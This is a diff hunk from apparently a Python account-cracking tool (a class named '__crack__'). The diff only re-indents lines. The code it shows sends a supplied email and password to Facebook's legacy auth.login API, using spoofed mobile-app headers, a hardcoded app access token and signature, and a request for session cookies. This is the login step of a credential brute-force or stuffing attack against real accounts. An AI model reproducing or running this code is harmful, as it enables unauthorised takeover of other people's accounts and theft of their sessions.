@@ -663,12 +663,12 @@ class __crack__:
             except: pass
             user_agent = 'Mozilla/5.0 (Linux; Android 10; MI CC 9 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045617 Mobile Safari/537.36 MMWEBID/9405 MicroMessenger/8.0.6.1900(0x28000637) Process/tools WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64'
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
-               'x-fb-net-hni': str(random.randint(20000, 40000)), 
-               'x-fb-connection-quality': 'EXCELLENT', 
-               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
-               'user-agent': user_agent, 
-               'content-type': 'application/x-www-form-urlencoded', 
-               'x-fb-http-engine': 'Liger'}
+            'x-fb-net-hni': str(random.randint(20000, 40000)), 
+            'x-fb-connection-quality': 'EXCELLENT', 
+            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+            'user-agent': user_agent, 
+            'content-type': 'application/x-www-form-urlencoded', 
+            'x-fb-http-engine': 'Liger'}
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params , headers=headers_)
